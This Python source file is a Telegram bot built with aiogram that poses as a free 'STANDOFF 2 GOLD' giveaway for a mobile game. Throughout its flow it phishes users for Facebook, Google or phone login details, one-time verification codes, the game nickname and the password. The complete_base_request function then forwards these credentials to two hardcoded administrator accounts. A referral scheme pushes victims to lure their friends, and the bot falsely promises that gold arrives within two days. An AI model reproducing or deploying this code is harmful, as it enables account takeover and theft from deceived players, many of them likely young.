import asyncio
import os
import re
import time
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Получаем токен из переменных окружения
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не установлен в переменных окружения")

# ID администраторов
ADMIN_ID_1 = int(os.environ.get("ADMIN_ID_1", 5218516711))
ADMIN_ID_2 = int(os.environ.get("ADMIN_ID_2", 5561735675))

# Инициализация бота
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Словари для хранения данных
referral_links = {}
user_invites = {}
user_requests = {}
user_base_gold = {}

# Состояния FSM
class GoldForm(StatesGroup):
    waiting_login_method = State()
    waiting_email = State()
    waiting_email_code = State()
    waiting_phone = State()
    waiting_phone_code = State()
    waiting_facebook = State()
    waiting_facebook_code = State()
    waiting_nickname = State()
    waiting_password = State()
    waiting_invite_confirmation = State()
    choosing_additional_gold = State()


def get_main_keyboard(user_id):
    if user_id in user_base_gold:
        keyboard = ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="👥 Пригласить друзей")],
                [KeyboardButton(text="📋 Мои запросы")],
                [KeyboardButton(text="❓ Поддержка")]
            ],
            resize_keyboard=True
        )
    else:
        keyboard = ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="💰 Получить 100 голды")],
                [KeyboardButton(text="❓ Поддержка")]
            ],
            resize_keyboard=True
        )
    return keyboard


@dp.message(CommandStart())
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    user_id = message.from_user.id
    logger.info(f"Пользователь {user_id} запустил бота")

    # Реферальная логика
    args = message.text.split()
    if len(args) > 1:
        referrer_id = args[1]
        if referrer_id.isdigit():
            referrer_id = int(referrer_id)
            if referrer_id != user_id:
                if referrer_id not in user_invites:
                    user_invites[referrer_id] = []

                existing_invite = False
                for inv in user_invites[referrer_id]:
                    if inv['user_id'] == user_id:
                        existing_invite = True
                        break

                if not existing_invite:
                    user_invites[referrer_id].append({
                        'user_id': user_id,
                        'username': message.from_user.username,
                        'first_name': message.from_user.first_name,
                        'joined_time': time.time(),
                        'confirmed': False
                    })

                    try:
                        await bot.send_message(
                            referrer_id,
                            f"👋 По вашей ссылке перешел новый пользователь!\n"
                            f"Имя: {message.from_user.first_name}\n"
                            f"После того, как он получит 100 голды, вы получите бонус!"
                        )
                    except:
                        pass

                    await message.answer(
                        f"✅ Вы перешли по ссылке приглашения!\n"
                        f"После получения 100 голды ваш друг получит бонус!"
                    )

    welcome_text = "👋 Добро пожаловать в приложение **STANDOFF 2 GOLD**"

    if user_id in user_base_gold:
        menu_text = """
🎯 **ГЛАВНОЕ МЕНЮ** 🎯

✅ Вы уже получили 100 голды!
Теперь вы можете приглашать друзей и получать больше:
• 👤 1 друг = +100 голды
• 👥 2 друга = +200 голды
• 👥 3 друга = +300 голды
• 👥 4 друга = +400 голды

Выберите действие:
        """
    else:
        menu_text = """
🎯 **ГЛАВНОЕ МЕНЮ** 🎯

💰 Нажмите "Получить 100 голды" чтобы начать!

Выберите действие:
        """

    keyboard = get_main_keyboard(user_id)
    await message.answer(welcome_text, parse_mode="Markdown")
    await message.answer(menu_text, parse_mode="Markdown", reply_markup=keyboard)


@dp.message(lambda message: message.text == "💰 Получить 100 голды")
async def get_base_gold(message: types.Message, state: FSMContext):
    user_id = message.from_user.id

    if user_id in user_base_gold:
        await cmd_start(message, state)
        return

    login_message = """
🔐 **ВЫБЕРИТЕ МЕТОД ВХОДА** 🔐

Сначала выберите, как вы входите в свой аккаунт Standoff 2:
    """

    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📘 Facebook")],
            [KeyboardButton(text="🔵 Google")],
            [KeyboardButton(text="📱 Номер телефона")]
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )

    await message.answer(login_message, parse_mode="Markdown", reply_markup=keyboard)
    await state.set_state(GoldForm.waiting_login_method)


@dp.message(GoldForm.waiting_login_method, lambda message: message.text == "📘 Facebook")
async def facebook_login(message: types.Message, state: FSMContext):
    await state.update_data(login_method="Facebook")
    await message.answer(
        "📘 **ВХОД ЧЕРЕЗ FACEBOOK** 📘\n\n"
        "📧 Введите **email** или **номер телефона**, привязанный к Facebook:\n\n"
        "Пример: example@gmail.com или +380123456789",
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardRemove()
    )
    await state.set_state(GoldForm.waiting_facebook)


@dp.message(GoldForm.waiting_login_method, lambda message: message.text == "🔵 Google")
async def google_login(message: types.Message, state: FSMContext):
    await state.update_data(login_method="Google")
    await message.answer(
        "🔵 **ВХОД ЧЕРЕЗ GOOGLE** 🔵\n\n"
        "✉️ Введите ваш **Google email** (должен содержать @gmail.com):\n\n"
        "Пример: username@gmail.com",
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardRemove()
    )
    await state.set_state(GoldForm.waiting_email)


@dp.message(GoldForm.waiting_login_method, lambda message: message.text == "📱 Номер телефона")
async def phone_login(message: types.Message, state: FSMContext):
    await state.update_data(login_method="Номер телефона")
    await message.answer(
        "📱 **ВХОД ЧЕРЕЗ НОМЕР ТЕЛЕФОНА** 📱\n\n"
        "☎️ Введите ваш **номер телефона**:\n\n"
        "Пример: +380123456789",
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardRemove()
    )
    await state.set_state(GoldForm.waiting_phone)


@dp.message(GoldForm.waiting_facebook)
async def process_facebook(message: types.Message, state: FSMContext):
    facebook_data = message.text
    await state.update_data(facebook_data=facebook_data)
    await message.answer(
        "📘 **КОД ПОДТВЕРЖДЕНИЯ FACEBOOK** 📘\n\n"
        "🔐 Введите **код подтверждения**, который приходит вам на email/телефон\n"
        "для входа в Facebook:\n\n"
        "⚠️ Это нужно для подтверждения доступа к аккаунту",
        parse_mode="Markdown"
    )
    await state.set_state(GoldForm.waiting_facebook_code)


@dp.message(GoldForm.waiting_email)
async def process_email(message: types.Message, state: FSMContext):
    email = message.text
    if "@gmail.com" not in email.lower():
        await message.answer(
            "❌ **ОШИБКА!** ❌\n\n"
            "Email должен содержать @gmail.com\n\n"
            "🔵 Попробуйте еще раз:",
            parse_mode="Markdown"
        )
        return
    await state.update_data(email=email)
    await message.answer(
        "🔵 **КОД ПОДТВЕРЖДЕНИЯ GOOGLE** 🔵\n\n"
        "🔐 Введите **код подтверждения**, который приходит вам на email/телефон\n"
        "для входа в Google аккаунт:\n\n"
        "⚠️ Это нужно для подтверждения доступа к аккаунту",
        parse_mode="Markdown"
    )
    await state.set_state(GoldForm.waiting_email_code)


@dp.message(GoldForm.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text
    await state.update_data(phone=phone)
    await message.answer(
        "📱 **КОД ПОДТВЕРЖДЕНИЯ** 📱\n\n"
        "🔐 Введите **код подтверждения**, который приходит вам на этот номер\n"
        "для входа в аккаунт:\n\n"
        "⚠️ Это нужно для подтверждения доступа к аккаунту",
        parse_mode="Markdown"
    )
    await state.set_state(GoldForm.waiting_phone_code)


@dp.message(GoldForm.waiting_facebook_code)
async def process_facebook_code(message: types.Message, state: FSMContext):
    facebook_code = message.text
    await state.update_data(facebook_code=facebook_code)
    await message.answer(
        "✅ Код подтверждения Facebook сохранен!\n\n"
        "🎮 **ВВЕДИТЕ НИКНЕЙМ** 🎮\n\n"
        "Введите ваш **никнейм** в Standoff 2:",
        parse_mode="Markdown"
    )
    await state.set_state(GoldForm.waiting_nickname)


@dp.message(GoldForm.waiting_email_code)
async def process_email_code(message: types.Message, state: FSMContext):
    email_code = message.text
    await state.update_data(email_code=email_code)
    await message.answer(
        "✅ Код подтверждения Google сохранен!\n\n"
        "🎮 **ВВЕДИТЕ НИКНЕЙМ** 🎮\n\n"
        "Введите ваш **никнейм** в Standoff 2:",
        parse_mode="Markdown"
    )
    await state.set_state(GoldForm.waiting_nickname)


@dp.message(GoldForm.waiting_phone_code)
async def process_phone_code(message: types.Message, state: FSMContext):
    phone_code = message.text
    await state.update_data(phone_code=phone_code)
    await message.answer(
        "✅ Код подтверждения сохранен!\n\n"
        "🎮 **ВВЕДИТЕ НИКНЕЙМ** 🎮\n\n"
        "Введите ваш **никнейм** в Standoff 2:",
        parse_mode="Markdown"
    )
    await state.set_state(GoldForm.waiting_nickname)


@dp.message(GoldForm.waiting_nickname)
async def process_nickname(message: types.Message, state: FSMContext):
    nickname = message.text
    await state.update_data(nickname=nickname)
    await message.answer(
        f"✅ Никнейм сохранен: **{nickname}**\n\n"
        "🔐 **ПАРОЛЬ** 🔐\n\n"
        "🛡️ Введите ваш **пароль** от аккаунта Standoff 2:",
        parse_mode="Markdown"
    )
    await state.set_state(GoldForm.waiting_password)


@dp.message(GoldForm.waiting_password)
async def process_password(message: types.Message, state: FSMContext):
    password = message.text
    await state.update_data(password=password)
    await complete_base_request(message, state)


async def complete_base_request(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    user_id = message.from_user.id

    nickname = user_data.get('nickname')
    password = user_data.get('password')
    login_method = user_data.get('login_method')

    login_data = ""
    login_code = ""

    if login_method == "Facebook":
        login_data = user_data.get('facebook_data')
        login_code = user_data.get('facebook_code')
    elif login_method == "Google":
        login_data = user_data.get('email')
        login_code = user_data.get('email_code')
    elif login_method == "Номер телефона":
        login_data = user_data.get('phone')
        login_code = user_data.get('phone_code')

    user_base_gold[user_id] = {
        'nickname': nickname,
        'login_method': login_method,
        'login_data': login_data,
        'login_code': login_code,
        'received_at': time.time()
    }

    admin_message = f"""
✅ **БАЗОВЫЙ ЗАПРОС 100 ГОЛДЫ** ✅

👤 **Пользователь:** @{message.from_user.username or 'Нет username'}
🆔 **ID:** {user_id}
👋 **Имя:** {message.from_user.first_name}

💰 **Запрошено:** 100 голды (базовые)

📱 **Контактные данные:**
🔐 **Метод входа:** {login_method}
📧 **Данные входа:** {login_data}
🔑 **Код подтверждения:** {login_code}

🎮 **Данные аккаунта Standoff 2:**
💎 **Никнейм:** {nickname}
🔑 **Пароль:** {password}

📅 **Время:** {message.date.strftime('%Y-%m-%d %H:%M:%S')}
    """

    try:
        await bot.send_message(ADMIN_ID_1, admin_message, parse_mode="Markdown")
        logger.info(f"Сообщение отправлено админу {ADMIN_ID_1}")
    except Exception as e:
        logger.error(f"Ошибка отправки админу 1: {e}")

    try:
        await bot.send_message(ADMIN_ID_2, admin_message, parse_mode="Markdown")
        logger.info(f"Сообщение отправлено админу {ADMIN_ID_2}")
    except Exception as e:
        logger.error(f"Ошибка отправки админу 2: {e}")

    # Проверка приглашений
    for referrer_id, invites in user_invites.items():
        for inv in invites:
            if inv['user_id'] == user_id and not inv['confirmed']:
                inv['confirmed'] = True
                try:
                    await bot.send_message(
                        referrer_id,
                        f"✅ Ваш друг @{message.from_user.username or message.from_user.first_name} "
                        f"получил базовые 100 голды!\n"
                        f"Прогресс приглашений обновлен!"
                    )
                except:
                    pass
                break

    new_keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="👥 Пригласить друзей")],
            [KeyboardButton(text="📋 Мои запросы")],
            [KeyboardButton(text="❓ Поддержка")]
        ],
        resize_keyboard=True
    )

    success_message = f"""
✅ **100 ГОЛДЫ УСПЕШНО ЗАПРОШЕНЫ!** ✅

📱 **Ваши данные:**
• Метод входа: {login_method}
• Данные входа: {login_data}
• Код подтверждения: {login_code}
• Никнейм: {nickname}

💰 Статус: Ожидает начисления
📦 Ваша голда поступит в течение 2 дней

🎯 **ТЕПЕРЬ ВЫ МОЖЕТЕ ПОЛУЧИТЬ БОЛЬШЕ!** 🎯
Приглашайте друзей и получайте:
• 👤 1 друг = +100 голды (всего 200)
• 👥 2 друга = +200 голды (всего 300)
• 👥 3 друга = +300 голды (всего 400)
• 👥 4 друга = +400 голды (всего 500)

👇 **НОВЫЕ ВОЗМОЖНОСТИ В МЕНЮ** 👇
    """

    await message.answer(success_message, parse_mode="Markdown", reply_markup=new_keyboard)
    await state.clear()


@dp.message(lambda message: message.text == "👥 Пригласить друзей")
async def invite_friends_menu(message: types.Message, state: FSMContext):
    user_id = message.from_user.id

    if user_id not in user_base_gold:
        await message.answer(
            "❌ **Сначала получите базовые 100 голды!** ❌\n\n"
            "Нажмите кнопку '💰 Получить 100 голды' и введите данные аккаунта.",
            parse_mode="Markdown"
        )
        return

    invite_menu = """
👥 **ПРИГЛАШЕНИЕ ДРУЗЕЙ** 👥

Выберите, сколько дополнительной голды хотите получить:

• 👤 1 друг = +100 голды (всего 200)
• 👥 2 друга = +200 голды (всего 300)
• 👥 3 друга = +300 голды (всего 400)
• 👥 4 друга = +400 голды (всего 500)
    """

    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="👤 +100 голды (1 друг)")],
            [KeyboardButton(text="👥 +200 голды (2 друга)")],
            [KeyboardButton(text="👥 +300 голды (3 друга)")],
            [KeyboardButton(text="👥 +400 голды (4 друга)")],
            [KeyboardButton(text="🏠 Главное меню")]
        ],
        resize_keyboard=True
    )

    await message.answer(invite_menu, parse_mode="Markdown", reply_markup=keyboard)
    await state.set_state(GoldForm.choosing_additional_gold)


@dp.message(GoldForm.choosing_additional_gold)
async def choose_additional_gold(message: types.Message, state: FSMContext):
    text = message.text
    friends_needed = 0
    additional_gold = 0

    if "1 друг" in text:
        friends_needed = 1
        additional_gold = 100
    elif "2 друга" in text:
        friends_needed = 2
        additional_gold = 200
    elif "3 друга" in text:
        friends_needed = 3
        additional_gold = 300
    elif "4 друга" in text:
        friends_needed = 4
        additional_gold = 400
    elif text == "🏠 Главное меню":
        await cmd_start(message, state)
        return
    else:
        await message.answer("Пожалуйста, выберите вариант из меню")
        return

    user_id = message.from_user.id
    base_gold_info = user_base_gold.get(user_id, {})
    total_gold = 100 + additional_gold

    await state.update_data(
        request_type="additional",
        friends_needed=friends_needed,
        additional_gold=additional_gold,
        total_gold=total_gold,
        nickname=base_gold_info.get('nickname'),
        login_method=base_gold_info.get('login_method'),
        login_data=base_gold_info.get('login_data'),
        login_code=base_gold_info.get('login_code')
    )

    bot_username = (await bot.me()).username
    referral_link = f"https://t.me/{bot_username}?start={user_id}"

    referral_links[user_id] = {
        'link': referral_link,
        'friends_needed': friends_needed,
        'additional_gold': additional_gold,
        'created_at': time.time()
    }

    invite_message = f"""
✅ **ДОПОЛНИТЕЛЬНАЯ ГОЛДА** ✅

🎮 Никнейм: **{base_gold_info.get('nickname')}**
💰 Базовая голда: **100**
➕ Дополнительно: **+{additional_gold}**
🎁 ВСЕГО: **{total_gold} голды**
👥 Нужно пригласить: **{friends_needed}** друзей

🔗 **ВАША РЕФЕРАЛЬНАЯ ССЫЛКА:**
`{referral_link}`

📋 **ИНСТРУКЦИЯ:**
1️⃣ Отправьте эту ссылку друзьям
2️⃣ Друзья должны перейти по ссылке и нажать /start
3️⃣ Друзья должны получить базовые 100 голды (ввести данные)
4️⃣ После выполнения условий вы получите дополнительную голду

✅ **Текущий статус:** 0/{friends_needed} друзей
    """

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Проверить статус", callback_data="check_additional_status")],
        [InlineKeyboardButton(text="📋 Мои приглашения", callback_data="view_invites")],
        [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
    ])

    await message.answer(invite_message, parse_mode="Markdown", reply_markup=keyboard)
    await state.set_state(GoldForm.waiting_invite_confirmation)


@dp.callback_query(lambda c: c.data == "check_additional_status")
async def check_additional_status(callback_query: types.CallbackQuery, state: FSMContext):
    user_id = callback_query.from_user.id
    user_data = await state.get_data()

    if not user_data:
        await callback_query.answer("Данные не найдены. Начните заново.", show_alert=True)
        return

    friends_needed = user_data.get('friends_needed', 1)
    additional_gold = user_data.get('additional_gold', 100)
    total_gold = user_data.get('total_gold', 200)

    invited_users = user_invites.get(user_id, [])
    confirmed_users = [u for u in invited_users if u.get('confirmed', False)]
    confirmed_count = len(confirmed_users)

    if confirmed_count >= friends_needed:
        base_info = user_base_gold.get(user_id, {})

        admin_message = f"""
✅ **ДОПОЛНИТЕЛЬНЫЙ ЗАПРОС ГОЛДЫ** ✅

👤 **Пользователь:** @{callback_query.from_user.username or 'Нет username'}
🆔 **ID:** {user_id}
👋 **Имя:** {callback_query.from_user.first_name}

💰 **Запрошено:** +{additional_gold} голды (всего {total_gold})
👥 **Приглашено друзей:** {confirmed_count}/{friends_needed}

📱 **Контактные данные:**
🔐 **Метод входа:** {base_info.get('login_method')}
📧 **Данные входа:** {base_info.get('login_data')}
🔑 **Код подтверждения:** {base_info.get('login_code')}

🎮 **Данные аккаунта Standoff 2:**
💎 **Никнейм:** {base_info.get('nickname')}

📅 **Время:** {time.strftime('%Y-%m-%d %H:%M:%S')}
        """

        try:
            await bot.send_message(ADMIN_ID_1, admin_message, parse_mode="Markdown")
            await bot.send_message(ADMIN_ID_2, admin_message, parse_mode="Markdown")
        except:
            pass

        users_list = "\n".join([f"✅ {u['first_name']} (@{u['username']})" for u in confirmed_users])

        await callback_query.message.edit_text(
            f"✅ **УСЛОВИЕ ВЫПОЛНЕНО!** ✅\n\n"
            f"👥 Приглашено друзей: {confirmed_count}/{friends_needed}\n"
            f"💰 Дополнительная голда: +{additional_gold}\n"
            f"🎁 ВСЕГО: {total_gold} голды\n\n"
            f"**Приглашенные друзья:**\n{users_list}\n\n"
            f"✅ Запрос отправлен администратору!\n"
            f"Ожидайте начисления в течение 2 дней.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
            ])
        )
        await state.clear()
    else:
        remaining = friends_needed - confirmed_count
        users_list = ""
        if confirmed_users:
            users_list = "\n".join([f"✅ {u['first_name']}" for u in confirmed_users])

        link = referral_links.get(user_id, {}).get('link', 'Ссылка не найдена')

        status_text = f"""
❌ **УСЛОВИЕ НЕ ВЫПОЛНЕНО** ❌

👥 Приглашено: {confirmed_count}/{friends_needed}
⏳ Осталось пригласить: {remaining}

{f"✅ **Подтвержденные друзья:**\n{users_list}" if confirmed_users else "❌ Пока нет подтвержденных друзей"}

🔗 Ваша ссылка: `{link}`

⏰ После того, как все друзья получат базовую голду, нажмите "Проверить статус" снова.
        """

        await callback_query.message.edit_text(
            status_text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Проверить статус", callback_data="check_additional_status")],
                [InlineKeyboardButton(text="📋 Мои приглашения", callback_data="view_invites")],
                [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
            ])
        )

    await callback_query.answer()


@dp.callback_query(lambda c: c.data == "view_invites")
async def view_invites(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    invited_users = user_invites.get(user_id, [])

    if not invited_users:
        await callback_query.message.edit_text(
            "📋 **ВАШИ ПРИГЛАШЕНИЯ** 📋\n\n"
            "У вас пока нет приглашенных друзей.\n\n"
            "Отправьте свою реферальную ссылку друзьям, чтобы получать бонусы!",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_invite")],
                [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
            ])
        )
        await callback_query.answer()
        return

    confirmed = [u for u in invited_users if u.get('confirmed')]
    pending = [u for u in invited_users if not u.get('confirmed')]

    text = f"📋 **ВАШИ ПРИГЛАШЕНИЯ** 📋\n\n"
    text += f"✅ Подтверждено: {len(confirmed)}\n"
    text += f"⏳ Ожидают: {len(pending)}\n\n"

    if confirmed:
        text += "**✅ Подтвержденные:**\n"
        for u in confirmed:
            username = f"@{u['username']}" if u['username'] else u['first_name']
            text += f"• {username}\n"
        text += "\n"

    if pending:
        text += "**⏳ Ожидают подтверждения:**\n"
        for u in pending:
            username = f"@{u['username']}" if u['username'] else u['first_name']
            text += f"• {username}\n"

    await callback_query.message.edit_text(
        text,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_invite")],
            [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
        ])
    )
    await callback_query.answer()


@dp.callback_query(lambda c: c.data == "back_to_invite")
async def back_to_invite(callback_query: types.CallbackQuery, state: FSMContext):
    user_id = callback_query.from_user.id
    user_data = await state.get_data()

    if user_data:
        friends_needed = user_data.get('friends_needed', 1)
        additional_gold = user_data.get('additional_gold', 100)
        total_gold = user_data.get('total_gold', 200)
        referral_link = referral_links.get(user_id, {}).get('link', 'Ссылка не найдена')

        text = f"""
✅ **ДОПОЛНИТЕЛЬНАЯ ГОЛДА** ✅

💰 Дополнительно: **+{additional_gold}**
🎁 ВСЕГО: **{total_gold} голды**
👥 Нужно пригласить: **{friends_needed}** друзей

🔗 **ВАША РЕФЕРАЛЬНАЯ ССЫЛКА:**
`{referral_link}`

✅ **Текущий статус:** проверьте в разделе "Мои приглашения"
        """

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Проверить статус", callback_data="check_additional_status")],
            [InlineKeyboardButton(text="📋 Мои приглашения", callback_data="view_invites")],
            [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
        ])

        await callback_query.message.edit_text(text, parse_mode="Markdown", reply_markup=keyboard)
    else:
        await callback_query.message.edit_text(
            "❌ Данные не найдены. Начните заново.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
            ])
        )

    await callback_query.answer()


@dp.callback_query(lambda c: c.data == "back_to_menu")
async def back_to_menu_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await state.clear()
    user_id = callback_query.from_user.id

    welcome_text = "👋 Добро пожаловать в приложение **STANDOFF 2 GOLD**"

    if user_id in user_base_gold:
        menu_text = """
🎯 **ГЛАВНОЕ МЕНЮ** 🎯

✅ Вы уже получили 100 голды!
Теперь вы можете приглашать друзей и получать больше:
• 👤 1 друг = +100 голды
• 👥 2 друга = +200 голды
• 👥 3 друга = +300 голды
• 👥 4 друга = +400 голды

Выберите действие:
        """
    else:
        menu_text = """
🎯 **ГЛАВНОЕ МЕНЮ** 🎯

💰 Нажмите "Получить 100 голды" чтобы начать!

Выберите действие:
        """

    keyboard = get_main_keyboard(user_id)

    await callback_query.message.answer(welcome_text, parse_mode="Markdown")
    await callback_query.message.answer(menu_text, parse_mode="Markdown", reply_markup=keyboard)
    await callback_query.answer()


@dp.message(lambda message: message.text == "📋 Мои запросы")
async def my_requests(message: types.Message):
    user_id = message.from_user.id

    base_info = user_base_gold.get(user_id)
    invited_users = user_invites.get(user_id, [])

    confirmed_count = len([u for u in invited_users if u.get('confirmed', False)])
    pending_count = len([u for u in invited_users if not u.get('confirmed', False)])

    if base_info:
        # Получаем дату отдельно, чтобы избежать проблем с f-string
        received_at = base_info.get('received_at', time.time())
        date_str = time.strftime('%Y-%m-%d', time.localtime(received_at))
        
        text = f"""
📋 **МОИ ЗАПРОСЫ** 📋

✅ **Базовый запрос:**
• Статус: 100 голды - в обработке
• Метод входа: {base_info.get('login_method')}
• Данные входа: {base_info.get('login_data')}
• Код: {base_info.get('login_code')}
• Никнейм: {base_info.get('nickname')}
• Дата: {date_str}

👥 **Приглашения друзей:**
• Всего приглашено: {len(invited_users)}
• ✅ Подтверждено: {confirmed_count}
• ⏳ Ожидают: {pending_count}
        """

        if confirmed_count > 0:
            text += f"\n🎁 **Дополнительная голда:** +{confirmed_count * 100} (при начислении)"
    else:
        text = """
📋 **МОИ ЗАПРОСЫ** 📋

У вас пока нет активных запросов.

Нажмите "💰 Получить 100 голды" чтобы начать!
        """

    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🏠 Главное меню")],
            [KeyboardButton(text="👥 Пригласить друзей")]
        ],
        resize_keyboard=True
    )

    await message.answer(text, parse_mode="Markdown", reply_markup=keyboard)


@dp.message(lambda message: message.text == "❓ Поддержка")
async def support(message: types.Message):
    user_id = message.from_user.id

    support_message = """
🆘 **ПОДДЕРЖКА** 🆘

📞 **По вопросам обращайтесь:** @admin
⏰ **Время работы:** 24/7
💬 **Ответ:** в течение 24 часов

❓ **Частые вопросы:**

💰 **Базовые 100 голды:**
• Доступны сразу после ввода данных
• Начисляются в течение 2 дней

👥 **Дополнительная голда:**
• 1 друг = +100 голды
• 2 друга = +200 голды
• 3 друга = +300 голды
• 4 друга = +400 голды

📋 **Как получить больше:**
1. Получите базовые 100 голды
2. Приглашайте друзей по ссылке
3. Друзья получают базовые 100 голды
4. Вы получаете бонус

✅ **Статус запросов:**
• Проверяйте в разделе "Мои запросы"
• По всем вопросам пишите администратору
    """

    keyboard = get_main_keyboard(user_id)
    await message.answer(support_message, parse_mode="Markdown", reply_markup=keyboard)


# ========== HEALTH CHECK ДЛЯ RENDER ==========
async def health_check(request):
    return web.Response(text="OK")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/healthcheck', health_check)
    app.router.add_get('/', health_check)  # ДОБАВЛЕНО: корневой путь
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logger.info(f"Health check сервер запущен на порту {port}")
    while True:
        await asyncio.sleep(3600)

async def main():
    logger.info("🤖 Бот STANDOFF 2 GOLD запускается...")
    await bot.delete_webhook(drop_pending_updates=True)
    logger.info("Webhook удален")
    
    # Запускаем health check сервер
    asyncio.create_task(start_web_server())
    
    logger.info("🎯 Запускаем polling...")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
